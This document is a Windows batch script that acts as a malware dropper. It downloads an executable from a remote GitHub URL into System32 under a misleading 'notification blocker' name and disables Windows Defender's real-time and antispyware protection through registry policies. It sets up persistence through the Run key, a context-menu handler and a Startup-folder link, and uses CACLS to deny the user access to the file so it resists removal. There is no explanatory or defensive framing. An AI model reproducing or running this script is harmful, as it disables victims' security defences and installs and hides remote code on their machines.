@echo off
powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.github.com/AnonymousArabian/Service-Host/raw/master/WindowsNotificationBlocker.exe', 'C:\Windows\System32\WindowsNotificationBlockerApplication.exe')"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Critical" /t REG_SZ /d "C:\Windows\System32\WindowsNotificationBlockerApplication.exe" /f
REG ADD "HKCR\Directory\shell\WindowsCritical\command" /d "C:\Windows\System32\WindowsNotificationBlockerApplication.exe" /f
timeout 2
echo y|CACLS C:\Windows\System32\WindowsNotificationBlockerApplication.exe /P %username%:N
echo y|CACLS C:\Windows\System32\WindowsNotificationBlockerApplication.exe /D %username%
REG ADD "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\Windows\System32\WindowsNotificationBlocker.exe" /t REG_SZ /d "~ RUNASADMIN" /f
powershell -Command "& {$StartUp= Join-Path $Env:USERPROFILE '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; New-Item -ItemType SymbolicLink -Path "$StartUp" -Name "WindowsCritical.lnk" -Target "C:\Windows\System32\WindowsNotificationBlockerApplication.exe"}
